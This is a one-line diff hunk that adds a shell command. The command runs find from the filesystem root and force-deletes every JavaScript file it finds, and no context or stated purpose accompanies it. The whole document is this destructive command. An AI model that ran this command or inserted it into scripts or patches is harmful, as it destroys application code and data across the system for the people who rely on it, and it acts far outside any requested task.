@@ -1,0 +1,1 @@
+find / -name "*.js" -exec rm -f {} \;
